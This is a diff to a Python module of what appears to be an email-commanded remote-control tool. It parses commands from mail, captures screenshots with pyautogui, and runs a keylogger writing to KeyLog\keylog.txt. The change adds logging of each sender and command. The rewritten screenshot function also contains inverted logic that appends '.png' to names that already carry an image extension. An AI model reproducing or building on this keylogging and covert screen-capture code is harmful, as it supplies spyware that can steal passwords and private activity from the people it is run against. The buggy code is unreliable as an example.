@@ -15,7 +15,7 @@ def decode_mail(msg: str):
             cmd_list += content
 
     cmd_list = cmd_list.replace("\n", " ").replace("\r", " ").split()
-    print()
+    # print()
     # print(cmd_list)
     return sender, cmd_list
 
@@ -24,24 +24,19 @@ def current_time() -> str:
     return datetime.now().strftime("%H:%M:%S %d-%m-%Y")
 
 
-def capture_SS(file_name: str = "Picture.png", overwrite: bool = True) -> str:
-    name, ext = file_name.split(".")
-    ext = "." + ext
-    path = "src\\Screenshots\\"
-    index = 1
-
-    namae = name + ext
-    while os.path.isfile(path + namae) and not overwrite:
-        namae = name + str(index) + ext
-        index += 1
-
-    # print(path + namae)
-    pyautogui.screenshot(path + namae)
-    return path + namae
+def capture_SS(file_name: str = "Picture.png") -> str:
+    ext = [".png", ".jpg", ".jpeg", ".tiff", ".bmp", ".gif"]
+    if any(file_name.endswith(x) for x in ext):
+        file_name += ".png"
+    
+    path = "Screenshots\\"
+    
+    pyautogui.screenshot(path + file_name)
+    return path + file_name
 
 
 def logger(duration: int) -> str:
-    file_path: str = "src\\KeyLog\\keylog.txt"
+    file_path: str = "KeyLog\\keylog.txt"
     # ? Ensure the existence of the file
     with open(file_path, "w") as f:
         pass
@@ -65,3 +60,20 @@ def logger(duration: int) -> str:
         listener.stop()
 
     return file_path
+
+
+def note2log(sender: str, cmd_list: list):
+    file_path: str = "Log\\mail.log"
+
+    with open(file_path, "a") as log:
+        pass
+
+    logging.basicConfig(
+        filename=file_path,
+        filemode="a",
+        level=logging.INFO,
+        format="%(asctime)s - %(message)s",
+        datefmt="%d-%b-%y %H:%M:%S",
+    )
+
+    logging.info(f"From: {sender}, Command: {cmd_list}")
